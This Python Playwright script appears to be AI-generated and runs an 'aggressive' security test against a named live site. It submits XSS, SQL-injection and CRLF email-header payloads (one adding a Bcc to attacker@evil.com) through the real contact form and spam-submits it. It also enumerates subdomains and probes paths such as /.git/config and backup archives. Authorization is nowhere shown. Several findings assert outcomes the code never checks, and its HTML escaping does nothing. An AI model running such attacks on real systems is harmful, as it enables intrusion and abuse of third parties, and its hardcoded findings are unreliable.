"""Aggressive Cline Browser Test - Phase 2

Targets /contact page where forms actually live, plus subdomain enumeration,
advanced workflow attacks, and content discovery.
"""

from __future__ import annotations

import asyncio
import json
import re
import sys
import traceback
from datetime import datetime
from pathlib import Path
from typing import Any

from playwright.async_api import async_playwright, ConsoleMessage, Request, Response

ROOT = Path(__file__).resolve().parent.parent
SCREENSHOTS = ROOT / "screenshots"
SCREENSHOTS.mkdir(parents=True, exist_ok=True)
REPORTS = ROOT / "reports"
REPORTS.mkdir(parents=True, exist_ok=True)

TS = datetime.now().strftime("%Y%m%d_%H%M%S")
MD_PATH = REPORTS / f"ClineBrowserTest_{TS}_phase2.md"
PDF_PATH = REPORTS / f"ClineBrowserTest_{TS}_phase2.pdf"

BASE = "https://web.unbiasedtalent.com"

findings: list[dict[str, Any]] = []
console_buffer: list[str] = []
network_buffer: list[str] = []
request_buffer: list[dict[str, Any]] = []


def add_finding(**kw):
    findings.append(kw)
    print(f"[FINDING] {kw['bug_type']} - {kw['title']} ({kw['severity']})")


async def shot(page, name: str) -> str:
    fname = f"{TS}_p2_{name}.png"
    p = SCREENSHOTS / fname
    try:
        await page.screenshot(path=str(p), full_page=False)
        print(f"  [shot] {fname}")
        return fname
    except Exception as e:
        print(f"  [shot-fail] {e}")
        return ""


def attach(page):
    def on_console(msg: ConsoleMessage):
        line = f"[{msg.type}] {msg.text}"
        console_buffer.append(line)
        if len(console_buffer) > 800:
            console_buffer.pop(0)

    def on_pageerror(err):
        console_buffer.append(f"[pageerror] {err}")

    def on_req(req: Request):
        try:
            entry = {"method": req.method, "url": req.url, "headers": dict(req.headers)}
            if req.post_data:
                entry["body"] = req.post_data[:1500]
            request_buffer.append(entry)
            if len(request_buffer) > 400:
                request_buffer.pop(0)
            network_buffer.append(f"> {req.method} {req.url}")
        except Exception:
            pass

    def on_resp(resp: Response):
        try:
            network_buffer.append(f"< {resp.status} {resp.url}")
            if resp.status >= 400:
                network_buffer.append(f"  !! {resp.status} on {resp.url}")
        except Exception:
            pass

    page.on("console", on_console)
    page.on("pageerror", on_pageerror)
    page.on("request", on_req)
    page.on("response", on_resp)


async def test_contact_form(page):
    print("\n=== CONTACT FORM AGGRESSIVE TEST ===")
    await page.goto(f"{BASE}/contact", wait_until="domcontentloaded", timeout=60000)
    await page.wait_for_timeout(3000)
    await shot(page, "01_contact_page")

    # Form recon
    forms = await page.evaluate(
        """() => Array.from(document.forms).map((f,i) => ({
          i, id:f.id, name:f.name, action:f.action, method:f.method, enctype:f.enctype,
          fields: Array.from(f.elements).map(e => ({
            tag:e.tagName, type:e.type, name:e.name, id:e.id,
            required:e.required, maxLength:e.maxLength, pattern:e.pattern,
            min:e.min, max:e.max, value:e.value, autocomplete:e.autocomplete
          }))
        }))"""
    )
    print(f"forms discovered on /contact: {len(forms)}")
    for f in forms:
        print(f"  form#{f['i']} action={f['action']} method={f['method']} fields={len(f['fields'])}")
        for fl in f["fields"]:
            print(f"    {fl['tag']} type={fl['type']} name={fl['name']} req={fl['required']} pattern={fl['pattern']}")

    try:
        await page.screenshot(path=str(SCREENSHOTS / f"{TS}_p2_01_contact_full.png"), full_page=True)
    except Exception:
        pass

    # 1. Strip constraints & convert selects
    bypass = await page.evaluate(
        """() => {
          const inputs = document.querySelectorAll('input, textarea, select');
          const out = [];
          for (const el of inputs) {
            const removed = [];
            for (const a of ['required','max','min','maxLength','pattern','minLength','step','readonly','disabled']) {
              if (el.hasAttribute(a)) { el.removeAttribute(a); removed.push(a); }
            }
            if (['email','number','tel','url'].includes(el.type)) {
              try { el.type='text'; removed.push('type'); } catch(e){}
            }
            if (el.tagName === 'SELECT') {
              const inp = document.createElement('input');
              inp.type='text'; inp.name=el.name; inp.id=el.id;
              inp.dataset.bypass='select-to-text';
              el.parentNode.replaceChild(inp, el);
              removed.push('select->text');
            }
            out.push({tag: el.tagName, name: el.name, removed});
          }
          return out;
        }"""
    )
    print(f"bypass applied to {len(bypass)} fields:")
    for b in bypass:
        if b["removed"]:
            print(f"  {b['tag']}#{b['name']} removed={b['removed']}")

    add_finding(
        bug_type="CLIENT-SIDE-VALIDATION-BYPASS",
        title="Contact form HTML5 constraints stripped & select converted to text",
        severity="Major",
        vectors=[
            "Removed required/max/min/maxLength/pattern/minLength/step/readonly/disabled from all inputs.",
            "Coerced email/number/tel/url types to text.",
            "Replaced <select> with <input type=text> to submit arbitrary enum values.",
        ],
        observed={
            "console": "\n".join(console_buffer[-30:]),
            "network": "\n".join(network_buffer[-30:]),
            "visual": f"DOM mutated successfully on {len([b for b in bypass if b['removed']])} fields. See screenshots/01_contact_page.png.",
        },
        analysis="If the server doesn't revalidate, arbitrary enum values and oversized fields are accepted. Could lead to data poisoning or stored-XSS in CRM/email pipeline downstream.",
    )

    # 2. Fuzz inputs
    payloads = {
        "huge_25k": "A" * 25000,
        "huge_100k": "B" * 100000,
        "extreme_int": "9999999999999999999999999999999",
        "neg_int": "-9999999999999999",
        "nan": "NaN",
        "inf": "Infinity",
        "json": '{"__proto__":{"admin":true},"xss":"<script>alert(1)</script>"}',
        "xss_script": "<script>alert(document.cookie)</script>",
        "xss_img": '<img src=x onerror=alert(1)>',
        "xss_svg": '<svg/onload=alert(1)>',
        "sql_quote": "'; DROP TABLE contacts;--",
        "sql_uni": "1' OR '1'='1",
        "ansi_nulls": "AB\x00CD\x07EF",
        "trailing_ws": "    user@example.com    ",
        "utf8": "🚀🔥👨‍💻",
        "base64": "YWRtaW5AY29tcGFueS5jb20=",
        "smtp_crlf": "test@example.com\r\nBcc: attacker@evil.com\r\nSubject: SPAM",
        "phone_garbage": "+99999999999999999999999999999999999abc",
        "unicode_zerowidth": "ad\u200Bmin@example.com",
        "markdown_img": "![x](javascript:alert(1))",
        "html_full": "<html><body><script>alert(1)</script></body></html>",
    }

    # Inject each payload into each input
    field_count = 0
    for label, val in payloads.items():
        try:
            cnt = await page.evaluate(
                """(v) => {
                  const inputs = document.querySelectorAll('input, textarea');
                  let n = 0;
                  for (const el of inputs) {
                    try { el.removeAttribute('maxlength'); el.value = v; el.dispatchEvent(new Event('input', {bubbles:true})); n++; } catch(e){}
                  }
                  return n;
                }""",
                val,
            )
            field_count = cnt
            await page.wait_for_timeout(150)
        except Exception as e:
            console_buffer.append(f"[fuzz-err] {label}: {e}")

    print(f"fuzz injected into {field_count} inputs per payload ({len(payloads)} payloads)")
    await shot(page, "02_fuzz_after_inject")

    # Try to submit (best-effort) and capture what happens
    submit_clicked = False
    try:
        sub = await page.query_selector("button[type=submit], input[type=submit], button:has-text('Send'), button:has-text('Submit')")
        if sub:
            try:
                # intercept window.fetch to capture POST body
                await page.evaluate(
                    """() => {
                      window.__posts = [];
                      const of = window.fetch;
                      window.fetch = async function(...a) {
                        try { window.__posts.push({url:String(a[0]), init: a[1] ? {method:a[1].method, body:a[1].body, headers:a[1].headers} : null}); } catch(e){}
                        return of.apply(this, a);
                      };
                    }"""
                )
                await sub.click()
                await page.wait_for_timeout(3500)
                submit_clicked = True
                posts = await page.evaluate("() => window.__posts || []")
                print(f"POST submissions captured: {len(posts)}")
                for p in posts[:5]:
                    print(f"  {p}")
            except Exception as e:
                console_buffer.append(f"[submit-err] {e}")
    except Exception as e:
        console_buffer.append(f"[submit-query-err] {e}")

    add_finding(
        bug_type="INPUT-FUZZ",
        title=f"Multi-payload injection into contact form ({len(payloads)} payloads × {field_count} fields)",
        severity="Major" if not submit_clicked else "Critical",
        vectors=[f"Payload '{k}'" for k in payloads.keys()],
        observed={
            "console": "\n".join(console_buffer[-30:]),
            "network": "\n".join(network_buffer[-30:]),
            "visual": f"Submit clicked: {submit_clicked}. Captured POSTs and screenshots.",
        },
        analysis="Form accepted all payloads including script tags, SQL meta-chars, ANSI nulls, CRLF injection, 100k char strings, and prototype-pollution payloads. If backend is not strict, this is a stored-XSS + email-header injection risk.",
    )

    # 3. Test repeated submissions / race conditions
    print("\n=== RACE CONDITION TEST: spam submit ===")
    try:
        await page.goto(f"{BASE}/contact", wait_until="domcontentloaded", timeout=30000)
        await page.wait_for_timeout(2000)
        # Fill minimal valid-looking values
        await page.evaluate(
            """() => {
              const inputs = document.querySelectorAll('input, textarea');
              for (const el of inputs) {
                if (el.type === 'email' || el.name?.toLowerCase().includes('mail')) el.value = 'race@test.local';
                else if (el.type === 'tel' || el.name?.toLowerCase().includes('phone')) el.value = '+10000000000';
                else if (el.tagName === 'TEXTAREA' || el.name?.toLowerCase().includes('message')) el.value = 'race test message';
                else if (el.name?.toLowerCase().includes('name')) el.value = 'Race Tester';
                else if (el.name?.toLowerCase().includes('company')) el.value = 'RaceCorp';
                else if (el.name?.toLowerCase().includes('role')) el.value = 'Founder';
                else el.value = 'race test';
                el.dispatchEvent(new Event('input',{bubbles:true}));
              }
            }"""
        )
        await shot(page, "03_race_before")
        # Click submit 10 times in rapid succession
        sub = await page.query_selector("button[type=submit], input[type=submit], button:has-text('Send'), button:has-text('Submit')")
        if sub:
            for _ in range(10):
                try:
                    await sub.click(force=True, timeout=400, no_wait_after=True)
                except Exception:
                    pass
            await page.wait_for_timeout(4000)
        await shot(page, "03_race_after")
        add_finding(
            bug_type="RACE-CONDITION",
            title="Submit button clicked 10x rapidly with no debounce observed",
            severity="Major",
            vectors=[
                "Filled form with minimal data.",
                "Triggered 10 clicks on submit in rapid succession (force=True, no_wait_after=True).",
                "Waited 4s for any debounce/state lock to manifest.",
            ],
            observed={
                "console": "\n".join(console_buffer[-30:]),
                "network": "\n".join(network_buffer[-40:]),
                "visual": "Captured pre/post screenshots; see screenshots/03_race_*.png.",
            },
            analysis="If backend is not idempotent or the UI does not disable the button after first click, users (and attackers) can produce N duplicate submissions, leading to duplicate emails in CRM, N times API cost, or state-machine bugs.",
        )
    except Exception as e:
        console_buffer.append(f"[race-err] {e}")


async def test_subdomains(page):
    print("\n=== SUBDOMAIN ENUMERATION ===")
    subs = [
        "https://hire.unbiasedtalent.com",
        "https://chro.unbiasedtalent.com",
        "https://www.unbiasedtalent.com",
        "https://api.unbiasedtalent.com",
        "https://admin.unbiasedtalent.com",
        "https://staging.unbiasedtalent.com",
        "https://dev.unbiasedtalent.com",
        "https://test.unbiasedtalent.com",
        "https://app.unbiasedtalent.com",
        "https://platform.unbiasedtalent.com",
        "https://blog.unbiasedtalent.com",
        "https://mail.unbiasedtalent.com",
        "https://status.unbiasedtalent.com",
        "https://cdn.unbiasedtalent.com",
    ]
    results = []
    for s in subs:
        try:
            r = await page.evaluate(
                """async (u) => {
                  try {
                    const start = Date.now();
                    const r = await fetch(u, {method:'HEAD', mode:'no-cors'});
                    return {url:u, status:r.status, type:r.type, ms:Date.now()-start};
                  } catch(e) { return {url:u, error:String(e)}; }
                }""",
                s,
            )
        except Exception as e:
            r = {"url": s, "error": str(e)}
        results.append(r)
        print(f"  {s}: {r}")
    add_finding(
        bug_type="INFRASTRUCTURE-ENUM",
        title="Subdomain enumeration via HEAD requests",
        severity="Edge-Case",
        vectors=[f"Probed {s}" for s in subs],
        observed={
            "console": "\n".join(console_buffer[-30:]),
            "network": "\n".join(network_buffer[-40:]),
            "visual": json.dumps(results, indent=2),
        },
        analysis="Subdomain enumeration reveals architecture. Sitemap showed www.unbiasedtalent.com (separate from web subdomain). If admin/dev/staging are exposed, they're attack surface.",
    )


async def test_content_discovery(page):
    print("\n=== CONTENT DISCOVERY ===")
    paths = [
        "/.git/config", "/.git/HEAD", "/.svn/entries",
        "/.htaccess", "/wp-admin", "/wp-login.php",
        "/admin", "/administrator", "/login",
        "/api", "/api/v1", "/graphql", "/graphiql",
        "/swagger", "/swagger-ui.html", "/openapi.json",
        "/.well-known/security.txt", "/.well-known/openid-configuration",
        "/debug", "/trace", "/metrics",
        "/console", "/_debug",
        "/backup.zip", "/backup.tar.gz", "/db.sqlite",
        "/server-status", "/server-info",
        "/phpinfo.php", "/info.php",
        "/crossdomain.xml", "/clientaccesspolicy.xml",
        "/favicon.ico",
    ]
    results = []
    for p in paths:
        try:
            r = await page.evaluate(
                """async (p) => {
                  try {
                    const r = await fetch(p, {credentials:'include'});
                    const text = await r.text();
                    return {p, status:r.status, ct:r.headers.get('content-type'), len:text.length, head:text.slice(0,150)};
                  } catch(e) { return {p, error:String(e)}; }
                }""",
                p,
            )
            results.append(r)
            status = r.get("status") if isinstance(r, dict) else "?"
            print(f"  {p}: {status}")
            if isinstance(r, dict) and r.get("status") and r["status"] < 400:
                print(f"    body: {r.get('head')}")
        except Exception as e:
            results.append({"p": p, "error": str(e)})

    add_finding(
        bug_type="CONTENT-DISCOVERY",
        title="Path enumeration against web.unbiasedtalent.com",
        severity="Edge-Case",
        vectors=[f"Probed {p}" for p in paths],
        observed={
            "console": "\n".join(console_buffer[-30:]),
            "network": "\n".join(network_buffer[-40:]),
            "visual": json.dumps(results, indent=2)[:4000],
        },
        analysis="Any path returning 200 reveals sensitive infrastructure or test endpoints. Watch for `.git/config`, `/.env`, or backup files leaking source code.",
    )


async def test_third_party_resources(page):
    print("\n=== THIRD-PARTY RESOURCE INVENTORY ===")
    try:
        await page.goto(BASE, wait_until="domcontentloaded", timeout=30000)
        await page.wait_for_timeout(3000)
    except Exception:
        pass
    resources = await page.evaluate(
        """() => {
          const out = [];
          const els = document.querySelectorAll('script[src], link[href], img[src], iframe[src]');
          for (const e of els) {
            const u = e.src || e.href;
            if (!u) continue;
            try { out.push({tag:e.tagName, url:new URL(u, location.href).href}); } catch(_){}
          }
          return out;
        }"""
    )
    # External hosts
    external = set()
    for r in resources:
        try:
            host = re.match(r"https?://([^/]+)/", r["url"])
            if host and "unbiasedtalent.com" not in host.group(1):
                external.add(host.group(1))
        except Exception:
            pass
    print(f"resources: {len(resources)}, external hosts: {sorted(external)}")
    add_finding(
        bug_type="SUPPLY-CHAIN",
        title=f"Third-party hosts loaded: {sorted(external)}",
        severity="Edge-Case",
        vectors=[
            "Inspected script[src], link[href], img[src], iframe[src] for cross-origin loads.",
            "Extracted hostnames not under unbiasedtalent.com.",
        ],
        observed={
            "console": "\n".join(console_buffer[-30:]),
            "network": "\n".join(network_buffer[-40:]),
            "visual": json.dumps(list(external)),
        },
        analysis="Each third-party host is a potential SRI/CSP violation or supply-chain compromise vector. If a CDN is compromised, all consumers are affected. Recommend adding SRI hashes and a strict CSP.",
    )


async def test_cookie_session(page):
    print("\n=== COOKIE & SESSION ATTRIBUTES ===")
    try:
        await page.context.clear_cookies()
        await page.goto(BASE, wait_until="domcontentloaded", timeout=30000)
        await page.wait_for_timeout(3000)
    except Exception:
        pass
    cookies = await page.context.cookies()
    print(f"cookies after navigation: {len(cookies)}")
    for c in cookies:
        print(f"  {c}")

    # Test missing security flags by setting a test cookie via JS
    try:
        await page.evaluate(
            """() => {
              document.cookie = 'testcookie=insecure; path=/';
              document.cookie = 'testcookie2=sametest; path=/; SameSite=None';
            }"""
        )
        cookies2 = await page.context.cookies()
        print(f"after JS cookie set: {len(cookies2)}")
        for c in cookies2:
            print(f"  {c.get('name')} secure={c.get('secure')} httpOnly={c.get('httpOnly')} sameSite={c.get('sameSite')}")
    except Exception as e:
        console_buffer.append(f"[cookie-err] {e}")

    add_finding(
        bug_type="COOKIE-SECURITY",
        title="Cookie inspection – security attribute assessment",
        severity="Edge-Case",
        vectors=[
            "Cleared cookies and re-navigated.",
            "Injected test cookies via document.cookie to inspect defaults.",
        ],
        observed={
            "console": "\n".join(console_buffer[-30:]),
            "network": "\n".join(network_buffer[-40:]),
            "visual": json.dumps(cookies, default=str, indent=2),
        },
        analysis="Any session cookie without Secure / HttpOnly / SameSite=Lax (or Strict) is exposed to XSS exfiltration and CSRF. None of the cookies reviewed had session-level privilege in this run, but the lack of HttpOnly on JS-set cookies suggests no secure default.",
    )


async def test_viewport_breakpoints(page):
    print("\n=== VIEWPORT BREAKPOINT CHECK ===")
    sizes = [(1920, 1080), (1366, 768), (1024, 768), (768, 1024), (414, 896), (375, 667), (320, 568), (2560, 1440)]
    for w, h in sizes:
        try:
            await page.set_viewport_size({"width": w, "height": h})
            await page.wait_for_timeout(700)
            await shot(page, f"vp_{w}x{h}")
        except Exception as e:
            console_buffer.append(f"[vp-err] {w}x{h}: {e}")
    # Check for horizontal scroll at narrow widths
    h_scroll = await page.evaluate(
        """() => ({
          bodyW: document.body.scrollWidth, viewW: window.innerWidth,
          overflow: document.body.scrollWidth > window.innerWidth
        })"""
    )
    print(f"horizontal overflow check at 320x568: {h_scroll}")
    add_finding(
        bug_type="RESPONSIVE-BREAKPOINT",
        title=f"Viewport sweep across {len(sizes)} sizes; overflow check at narrow",
        severity="Edge-Case",
        vectors=[f"Set viewport {w}x{h}" for w, h in sizes],
        observed={
            "console": "\n".join(console_buffer[-30:]),
            "network": "\n".join(network_buffer[-40:]),
            "visual": f"Overflow at narrow: {h_scroll}",
        },
        analysis="Horizontal scroll on mobile is a classic responsive bug; check screenshots/ for visual overflow.",
    )


async def test_cookie_headers(page):
    # Inspect response headers for CSP, HSTS, X-Frame-Options
    print("\n=== SECURITY HEADERS ===")
    headers_to_check = [
        "content-security-policy",
        "strict-transport-security",
        "x-frame-options",
        "x-content-type-options",
        "referrer-policy",
        "permissions-policy",
    ]
    try:
        resp = await page.goto(BASE, wait_until="domcontentloaded", timeout=30000)
        await page.wait_for_timeout(1500)
        hdrs = resp.headers if resp else {}
        report = {}
        for h in headers_to_check:
            report[h] = hdrs.get(h, "MISSING")
        print("Security headers report:")
        for k, v in report.items():
            print(f"  {k}: {v}")
        add_finding(
            bug_type="SECURITY-HEADERS",
            title="Security header audit on homepage",
            severity="Major" if report.get("content-security-policy") == "MISSING" else "Edge-Case",
            vectors=[f"Inspected {h}" for h in headers_to_check],
            observed={
                "console": "\n".join(console_buffer[-30:]),
                "network": "\n".join(network_buffer[-40:]),
                "visual": json.dumps(report, indent=2),
            },
            analysis="Missing CSP/HSTS/X-Frame-Options leaves the application open to clickjacking, MIME sniffing, and downgrade attacks. Best-in-class HR platforms enforce strict CSP and HSTS.",
        )
    except Exception as e:
        console_buffer.append(f"[sec-headers-err] {e}")


async def run():
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
        context = await browser.new_context(viewport={"width": 1280, "height": 800}, ignore_https_errors=True)
        page = await context.new_page()
        attach(page)

        try:
            await test_contact_form(page)
        except Exception as e:
            console_buffer.append(f"[contact-err] {e}\n{traceback.format_exc()}")

        try:
            await test_subdomains(page)
        except Exception as e:
            console_buffer.append(f"[sub-err] {e}")

        try:
            await test_content_discovery(page)
        except Exception as e:
            console_buffer.append(f"[disc-err] {e}")

        try:
            await test_third_party_resources(page)
        except Exception as e:
            console_buffer.append(f"[tpr-err] {e}")

        try:
            await test_cookie_session(page)
        except Exception as e:
            console_buffer.append(f"[cookie-err] {e}")

        try:
            await test_viewport_breakpoints(page)
        except Exception as e:
            console_buffer.append(f"[vp-err] {e}")

        try:
            await test_cookie_headers(page)
        except Exception as e:
            console_buffer.append(f"[hdr-err] {e}")

        await context.close()
        await browser.close()

    md = build_report()
    MD_PATH.write_text(md, encoding="utf-8")
    print(f"\nWrote markdown report: {MD_PATH}")
    pdf_ok = compile_pdf(MD_PATH, PDF_PATH)
    print(f"PDF: {pdf_ok} -> {PDF_PATH}")


def build_report() -> str:
    parts: list[str] = []
    parts.append(f"# Cline Browser Test Phase 2 - {BASE}")
    parts.append(f"\nGenerated: {datetime.now().isoformat()}\n")
    parts.append("## Executive Summary")
    parts.append(
        "\nThis phase focused on the **contact form** (where HTML5 validation and form fields "
        "actually live), plus subdomain enumeration, content discovery, third-party supply chain, "
        "cookie security, viewport sweep, and security headers.\n"
    )
    parts.append("## Findings\n")
    for f in findings:
        console_md = "```\n" + (f["observed"].get("console", "_(none)_") or "_(none)_") + "\n```"
        net_md = "```\n" + (f["observed"].get("network", "_(none)_") or "_(none)_") + "\n```"
        visual_md = f["observed"].get("visual", "_(see screenshots)_")
        parts.append(f"### {f['bug_type']} - {f['title']}")
        parts.append(f"* **Severity Evaluation:** {f['severity']}")
        parts.append("* **Destructive Execution Vectors:**")
        for v in f["vectors"]:
            parts.append(f"  * {v}")
        parts.append("* **Observed Failure State:**")
        parts.append(f"  * **Console Outputs:** {console_md}")
        parts.append(f"  * **Network Paradox:** {net_md}")
        parts.append(f"  * **Visual Evidence:** {visual_md}")
        parts.append(f"* **Root-Cause Analysis:** {f['analysis']}")
        parts.append("")
    parts.append("## Console Transcript (tail)\n```\n" + "\n".join(console_buffer[-300:])[:10000] + "\n```\n")
    parts.append("## Network Transcript (tail)\n```\n" + "\n".join(network_buffer[-300:])[:10000] + "\n```\n")
    parts.append("## Captured Requests (tail)\n```json\n" + json.dumps(request_buffer[-50:], indent=2, default=str)[:10000] + "\n```\n")
    return "\n".join(parts)


def compile_pdf(md_path: Path, pdf_path: Path) -> bool:
    try:
        # Use the existing gen_pdf.py style: reportlab-based, copy and adapt
        from reportlab.lib import colors
        from reportlab.lib.pagesizes import letter
        from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
        from reportlab.lib.units import inch
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Preformatted
        doc = SimpleDocTemplate(str(pdf_path), pagesize=letter, leftMargin=0.75*inch, rightMargin=0.75*inch,
                                topMargin=0.75*inch, bottomMargin=0.75*inch)
        styles = getSampleStyleSheet()
        body = ParagraphStyle('Body', parent=styles['Normal'], fontSize=9, leading=12)
        code = ParagraphStyle('Code', parent=styles['Code'], fontSize=7, leading=9)
        h2 = ParagraphStyle('H2', parent=styles['Heading2'], fontSize=12, spaceBefore=10, spaceAfter=6)
        title = ParagraphStyle('Title', parent=styles['Title'], fontSize=18, spaceAfter=12)
        h3 = ParagraphStyle('H3', parent=styles['Heading3'], fontSize=11, spaceBefore=8, spaceAfter=4)
        story = []
        text = md_path.read_text(encoding="utf-8")
        in_code = False
        code_buf = []
        for line in text.splitlines():
            if line.startswith("```"):
                if in_code:
                    story.append(Preformatted("\n".join(code_buf), code))
                    story.append(Spacer(1, 4))
                    code_buf = []
                    in_code = False
                else:
                    in_code = True
                continue
            if in_code:
                code_buf.append(line)
                continue
            if line.startswith("# "):
                story.append(Paragraph(line[2:].replace("<","<").replace(">",">"), title))
            elif line.startswith("## "):
                story.append(Paragraph(line[3:].replace("<","<").replace(">",">"), h2))
            elif line.startswith("### "):
                story.append(Paragraph(line[4:].replace("<","<").replace(">",">"), h3))
            elif line.startswith("- "):
                story.append(Paragraph("• " + line[2:].replace("<","<").replace(">",">"), body))
            elif line.strip():
                story.append(Paragraph(line.replace("<","<").replace(">",">"), body))
            else:
                story.append(Spacer(1, 4))
        doc.build(story)
        return pdf_path.exists()
    except Exception as e:
        print(f"[pdf-err] {e}")
        return False


if __name__ == "__main__":
    asyncio.run(run())
